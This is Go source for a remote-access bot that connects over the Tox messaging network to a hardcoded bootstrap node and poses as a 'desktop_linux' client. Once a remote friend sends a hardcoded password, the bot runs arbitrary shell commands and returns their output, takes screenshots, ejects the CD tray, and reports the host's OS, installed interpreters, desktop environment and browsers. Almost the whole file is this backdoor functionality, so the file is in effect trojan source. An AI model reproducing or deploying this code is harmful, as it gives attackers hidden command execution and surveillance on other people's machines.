package main

import (
    "io/ioutil"
    "log"
    "math/rand"
    "strconv"
    "strings"
    "time"
    "github.com/kitech/go-toxcore"
    "fmt"
    "os"
    "os/exec"
    "github.com/vova616/screenshot"
    "image/png"
    "path/filepath"
)

func init() {
    log.SetFlags(log.Flags() | log.Lshortfile)
}

var server = []interface{}{
    "205.185.116.116", uint16(33445), "A179B09749AC826FF01F37A9613F6B57118AE014D4196A0E1105A98F93A54702",
}
var fname = "./toxecho.data"
var debug = false
var nickPrefix = "go_team."
var statusText = "Version desktop_linux_0.6"



func main() {
    authed := false
    opt := tox.NewToxOptions()
    if tox.FileExist(fname) {
        data, err := ioutil.ReadFile(fname)
        if err != nil {
            log.Println(err)
        } else {
            opt.Savedata_data = data
            opt.Savedata_type = tox.SAVEDATA_TYPE_TOX_SAVE
        }
    }
    opt.Tcp_port = 33445
    var t *tox.Tox
    for i := 0; i < 5; i++ {
        t = tox.NewTox(opt)
        if t == nil {
            opt.Tcp_port += 1
        } else {
            break
        }
    }

    r, err := t.Bootstrap(server[0].(string), server[1].(uint16), server[2].(string))
    r2, err := t.AddTcpRelay(server[0].(string), server[1].(uint16), server[2].(string))
    if debug {
        log.Println("bootstrap:", r, err, r2)
    }

    pubkey := t.SelfGetPublicKey()
    seckey := t.SelfGetSecretKey()
    toxid := t.SelfGetAddress()
    if debug {
        log.Println("keys:", pubkey, seckey, len(pubkey), len(seckey))
    }
    log.Println("toxid:", toxid)

    defaultName, err := t.SelfGetName()
    humanName := nickPrefix + toxid[0:5]
    if humanName != defaultName {
        t.SelfSetName(humanName)
    }
    humanName, err = t.SelfGetName()
    if debug {
        log.Println(humanName, defaultName, err)
    }

    defaultStatusText, err := t.SelfGetStatusMessage()
    if defaultStatusText != statusText {
        t.SelfSetStatusMessage(statusText)
    }
    if debug {
        log.Println(statusText, defaultStatusText, err)
    }

    sz := t.GetSavedataSize()
    sd := t.GetSavedata()
    if debug {
        log.Println("savedata:", sz, t)
        log.Println("savedata", len(sd), t)
    }
    err = t.WriteSavedata(fname)
    if debug {
        log.Println("savedata write:", err)
    }

    // add friend norequest
    fv := t.SelfGetFriendList()
    for _, fno := range fv {
        fid, err := t.FriendGetPublicKey(fno)
        if err != nil {
            log.Println(err)
        } else {
            t.FriendAddNorequest(fid)
        }
    }
    if debug {
        log.Println("add friends:", len(fv))
    }

    // callbacks
    t.CallbackSelfConnectionStatus(func(t *tox.Tox, status uint32, userData interface{}) {
        if debug {
            log.Println("on self conn status:", status, userData)
        }
    }, nil)
    t.CallbackFriendRequest(func(t *tox.Tox, friendId string, message string, userData interface{}) {
        log.Println(friendId, message)
        num, err := t.FriendAddNorequest(friendId)
        fmt.Println(friendId)
        if debug {
            log.Println("on friend request:", num, err)
        }
        if num < 100000 {
            t.WriteSavedata(fname)
        }
    }, nil)
    t.CallbackFriendMessage(func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
        if debug {
            log.Println("on friend message:", friendNumber, message)
        }
        var password = "password"
        switch message {
            case "!" + password:
                t.FriendSendMessage(friendNumber, "authed")
                authed = true
            case "!check auth":
                if authed == true {
                    t.FriendSendMessage(friendNumber, "You are authed")
                } else {
                    t.FriendSendMessage(friendNumber, "You are not authed")
                }
            case "!unauth":
                if authed == true {
                    authed = false
                    t.FriendSendMessage(friendNumber, "You are now unauthed")
                }
            case "!exit":
                if authed == true {
                    t.FriendSendMessage(friendNumber, "Exiting")
                    os.Exit(1)
                }
            default:
                if authed == true {
                    if len([]rune(message)) >= 6 && string(message[0:6]) == "!shell" {
                        s := strings.Split(message, " ")
                        total_args := len(s)
                        command := s[1:total_args]
                        cmd := exec.Command("sh", "-c", strings.Join(command, " "))
                        stdout, err := cmd.Output()
                        if err != nil {
                            println(err.Error())
                        }
                        t.FriendSendMessage(friendNumber, string(stdout))
                    } else if string(message) == "!open_tray" {
                        exec.Command("eject").Output()
                    } else if string(message) == "!close_tray" {
                        systemCall("eject -t")
                    } else if string(message) == "!screenshot" {
                        img, err := screenshot.CaptureScreen()
                           if err != nil {
                               panic(err)
                            }
                            tNow := time.Now().UTC()
                            f, err := os.Create(tNow.String() + ".png")
                            if err != nil {
                                t.FriendSendMessage(friendNumber, "Error creating screenshot file")
                            }
                            err = png.Encode(f, img)
                            if err != nil {
                                t.FriendSendMessage(friendNumber, "Error encoding screenshot")
                             }
                            f.Close()
                    } else if string(message) == "!os_check" {
                        if debug == true {
                            fmt.Println("Checking OS")
                        }
                        info := check_os()
                        t.FriendSendMessage(friendNumber, string(info))
                    } else if string(message) == "!check_mono_install" {
                        message := fmt.Sprintf("Mono %v\nMCS %v", checkMonoInstall(), checkMonoCompilerInstall())
                        t.FriendSendMessage(friendNumber, message)
                    } else if string(message) == "!check_python_install" {
                        message := fmt.Sprintf("python %v\npython3 %v", checkPython2Install(), checkPython3Install())
                        t.FriendSendMessage(friendNumber, message)
                    } else if string(message) == "!check_go_install" {
                        message := fmt.Sprintf("go %v", checkGoInstall())
                        t.FriendSendMessage(friendNumber, message)
                    } else if string(message) == "!detect_de" {
                        de := detectDE()
                        t.FriendSendMessage(friendNumber, de)
                    } else if string(message) == "!get_running_dir" {
                        runningDir := getRunningDir()
                        t.FriendSendMessage(friendNumber, runningDir)
                    } else if string(message) == "!detect_browsers" {
                        t.FriendSendMessage(friendNumber, detectBrowsers())
                    }
                fmt.Println(len([]rune(message)))
            }
        }
    }, nil)
    t.CallbackFriendConnectionStatus(func(t *tox.Tox, friendNumber uint32, status uint32, userData interface{}) {
        if debug {
            friendId, err := t.FriendGetPublicKey(friendNumber)
            log.Println("on friend connection status:", friendNumber, status, friendId, err)
        }
    }, nil)
    t.CallbackFriendStatus(func(t *tox.Tox, friendNumber uint32, status uint8, userData interface{}) {
        if debug {
            friendId, err := t.FriendGetPublicKey(friendNumber)
            log.Println("on friend status:", friendNumber, status, friendId, err)
        }
    }, nil)
    t.CallbackFriendStatusMessage(func(t *tox.Tox, friendNumber uint32, statusText string, userData interface{}) {
        if debug {
            friendId, err := t.FriendGetPublicKey(friendNumber)
            log.Println("on friend status text:", friendNumber, statusText, friendId, err)
        }
    }, nil)

    // some vars for file echo
    var recvFiles = make(map[uint64]uint32, 0)
    var sendFiles = make(map[uint64]uint32, 0)
    var sendDatas = make(map[string][]byte, 0)
    var chunkReqs = make([]string, 0)
    trySendChunk := func(friendNumber uint32, fileNumber uint32, position uint64) {
        sentKeys := make(map[string]bool, 0)
        for _, reqkey := range chunkReqs {
            lst := strings.Split(reqkey, "_")
            pos, err := strconv.ParseUint(lst[2], 10, 64)
            if err != nil {
            }
            if data, ok := sendDatas[reqkey]; ok {
                r, err := t.FileSendChunk(friendNumber, fileNumber, pos, data)
                if err != nil {
                    if err.Error() == "toxcore error: 7" || err.Error() == "toxcore error: 8" {
                    } else {
                        log.Println("file send chunk error:", err, r, reqkey)
                    }
                    break
                } else {
                    delete(sendDatas, reqkey)
                    sentKeys[reqkey] = true
                }
            }
        }
        leftChunkReqs := make([]string, 0)
        for _, reqkey := range chunkReqs {
            if _, ok := sentKeys[reqkey]; !ok {
                leftChunkReqs = append(leftChunkReqs, reqkey)
            }
        }
        chunkReqs = leftChunkReqs
    }
    if trySendChunk != nil {
    }

    t.CallbackFileRecvControl(func(t *tox.Tox, friendNumber uint32, fileNumber uint32,
        control int, userData interface{}) {
        if debug {
            friendId, err := t.FriendGetPublicKey(friendNumber)
            log.Println("on recv file control:", friendNumber, fileNumber, control, friendId, err)
        }
        key := uint64(uint64(friendNumber)<<32 | uint64(fileNumber))
        if control == tox.FILE_CONTROL_RESUME {
            if fno, ok := sendFiles[key]; ok {
                t.FileControl(friendNumber, fno, tox.FILE_CONTROL_RESUME)
            }
        } else if control == tox.FILE_CONTROL_PAUSE {
            if fno, ok := sendFiles[key]; ok {
                t.FileControl(friendNumber, fno, tox.FILE_CONTROL_PAUSE)
            }
        } else if control == tox.FILE_CONTROL_CANCEL {
            if fno, ok := sendFiles[key]; ok {
                t.FileControl(friendNumber, fno, tox.FILE_CONTROL_CANCEL)
            }
        }
    }, nil)
    t.CallbackFileRecv(func(t *tox.Tox, friendNumber uint32, fileNumber uint32, kind uint32,
        fileSize uint64, fileName string, userData interface{}) {
        if debug {
            friendId, err := t.FriendGetPublicKey(friendNumber)
            log.Println("on recv file:", friendNumber, fileNumber, kind, fileSize, fileName, friendId, err)
        }
        if fileSize > 1024*1024*1024 {
            // good guy
        }

        var reFileName = "Re_" + fileName
        reFileNumber, err := t.FileSend(friendNumber, kind, fileSize, reFileName, reFileName)
        if err != nil {
        }
        recvFiles[uint64(uint64(friendNumber)<<32|uint64(fileNumber))] = reFileNumber
        sendFiles[uint64(uint64(friendNumber)<<32|uint64(reFileNumber))] = fileNumber
    }, nil)
    t.CallbackFileRecvChunk(func(t *tox.Tox, friendNumber uint32, fileNumber uint32,
        position uint64, data []byte, userData interface{}) {
        friendId, err := t.FriendGetPublicKey(friendNumber)
        if debug {
            // log.Println("on recv chunk:", friendNumber, fileNumber, position, len(data), friendId, err)
        }

        if len(data) == 0 {
            if debug {
                log.Println("recv file finished:", friendNumber, fileNumber, friendId, err)
            }
        } else {
            reFileNumber := recvFiles[uint64(uint64(fileNumber)<<32|uint64(fileNumber))]
            key := makekey(friendNumber, reFileNumber, position)
            sendDatas[key] = data
            trySendChunk(friendNumber, reFileNumber, position)
        }
    }, nil)
    t.CallbackFileChunkRequest(func(t *tox.Tox, friendNumber uint32, fileNumber uint32, position uint64,
        length int, userData interface{}) {
        friendId, err := t.FriendGetPublicKey(friendNumber)
        if length == 0 {
            if debug {
                log.Println("send file finished:", friendNumber, fileNumber, friendId, err)
            }
            origFileNumber := sendFiles[uint64(uint64(fileNumber)<<32|uint64(fileNumber))]
            delete(sendFiles, uint64(uint64(fileNumber)<<32|uint64(fileNumber)))
            delete(recvFiles, uint64(uint64(fileNumber)<<32|uint64(origFileNumber)))
        } else {
            key := makekey(friendNumber, fileNumber, position)
            chunkReqs = append(chunkReqs, key)
            trySendChunk(friendNumber, fileNumber, position)
        }
    }, nil)

    // audio/video
    av := tox.NewToxAV(t)
    if av == nil {
    }
    av.CallbackCall(func(av *tox.ToxAV, friendNumber uint32, audioEnabled bool,
        videoEnabled bool, userData interface{}) {
        if debug {
            log.Println("oncall:", friendNumber, audioEnabled, videoEnabled)
        }
        var audioBitRate uint32 = 48
        var videoBitRate uint32 = 64
        r, err := av.Answer(friendNumber, audioBitRate, videoBitRate)
        if err != nil {
            log.Println(err, r)
        }
    }, nil)
    av.CallbackCallState(func(av *tox.ToxAV, friendNumber uint32, state uint32, userData interface{}) {
        if debug {
            log.Println("on call state:", friendNumber, state)
        }
    }, nil)
    av.CallbackAudioReceiveFrame(func(av *tox.ToxAV, friendNumber uint32, pcm []byte,
        sampleCount int, channels int, samplingRate int, userData interface{}) {
        if debug {
            if rand.Int()%23 == 3 {
                log.Println("on recv audio frame:", friendNumber, len(pcm), sampleCount, channels, samplingRate)
            }
        }
        r, err := av.AudioSendFrame(friendNumber, pcm, sampleCount, channels, samplingRate)
        if err != nil {
            log.Println(err, r)
        }
    }, nil)
    av.CallbackVideoReceiveFrame(func(av *tox.ToxAV, friendNumber uint32, width uint16, height uint16,
        frames []byte, userData interface{}) {
        if debug {
            if rand.Int()%45 == 3 {
                log.Println("on recv video frame:", friendNumber, width, height, len(frames))
            }
        }
        r, err := av.VideoSendFrame(friendNumber, width, height, frames)
        if err != nil {
            log.Println(err, r)
        }
    }, nil)

    // toxav loops
    go func() {
        shutdown := false
        loopc := 0
        itval := 0
        for !shutdown {
            iv := av.IterationInterval()
            if iv != itval {
                // wtf
                if iv-itval > 20 || itval-iv > 20 {
                    log.Println("av itval changed:", itval, iv, iv-itval, itval-iv)
                }
                itval = iv
            }

            av.Iterate()
            loopc += 1
            time.Sleep(1000 * 50 * time.Microsecond)
        }

        av.Kill()
    }()

    // toxcore loops
    shutdown := false
    loopc := 0
    itval := 0
    for !shutdown {
        iv := t.IterationInterval()
        if iv != itval {
            if debug {
                if itval-iv > 20 || iv-itval > 20 {
                    log.Println("tox itval changed:", itval, iv)
                }
            }
            itval = iv
        }

        t.Iterate()
        status := t.SelfGetConnectionStatus()
        if loopc%5500 == 0 {
            if status == 0 {
                if debug {
                    fmt.Print(".")
                }
            } else {
                if debug {
                    fmt.Print(status, ",")
                }
            }
        }
        loopc += 1
        time.Sleep(1000 * 50 * time.Microsecond)
    }

    t.Kill()
}

func makekey(no uint32, a0 interface{}, a1 interface{}) string {
    return fmt.Sprintf("%d_%v_%v", no, a0, a1)
}

func _dirty_init() {
    log.Println("ddddddddd")
    tox.KeepPkg()
}

func check_os() []byte {
    os_info, err := exec.Command("sh","-c", "lsb_release -a").Output()
    if err != nil {
        fmt.Println("Error in OS check")
    }
    return os_info
}

func exists(path string) (bool, error) {
    _, err := os.Stat(path)
    if err == nil {
        return true, nil
    }
    if os.IsNotExist(err) {
        return false, nil
    }
    return true, err
}

func checkPython3Install() (bool) {
    installed, err := exists("/usr/bin/python3.5")
    if err != nil {
        return false
    }
    return installed
}

func checkPython2Install() (bool) {
    installed, err := exists("/usr/bin/python2.7")
    if err != nil {
        return false
    }
    return installed
}

func checkMonoInstall() (bool) {
    installed, err := exists("/usr/bin/mono")
    if err != nil {
        return false
    }
    return installed
}

func checkMonoCompilerInstall() (bool) {
    installed, err := exists("/usr/bin/mcs")
    if err != nil {
        return false
    }
    return installed
}

func checkGoInstall() (bool) {
    installed, err := exists("/usr/bin/go")
    if err != nil {
        return false
    }
    return installed
}

// func csCompile(code string) (bool) {
//     if checkMonoCompilerInstall() == true {
//         systemCall("mcs")
//     }
//
// }

func systemCall(command string) ([]byte) {
    cmd := exec.Command("sh", "-c", command)
    stdout, err := cmd.Output()
    if err != nil {
        log.Println(err)
    }
    return stdout
}

func detectDE() (string) {
    mate, err := exists("/usr/share/mate")
    if  mate == true {
        return "Mate"
    }
    cinnamon, err := exists("/usr/bin/cinnamon")
    if cinnamon == true {
        return "Cinnamon"
    }
    if err != nil {
        return "There was an error trying to detect the DE"
    }
    return "Unknown DE"
}

func getRunningDir() (string) {
    dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
    if err != nil {
            log.Fatal(err)
    }
    return dir
}

func detectBrowsers() (string) {
    firefox, err := exists("/usr/bin/firefox")
    chromium, err := exists("/usr/bin/chromium-browser")
    iceweasel, err := exists("/usr/bin/iceweasel")
    chrome, err := exists("/usr/bin/google-chrome")
    chrome_stable, err := exists("/usr/bin/google-chrome-stable")
    browsers := fmt.Sprintf("Firefox %v\nIceweasel %v\nChromium %v\nChrome %v\nChrome_stable %v", firefox, iceweasel, chromium, chrome, chrome_stable)
    if err != nil {
        return "Error in browser detection"
    }
    return browsers
}
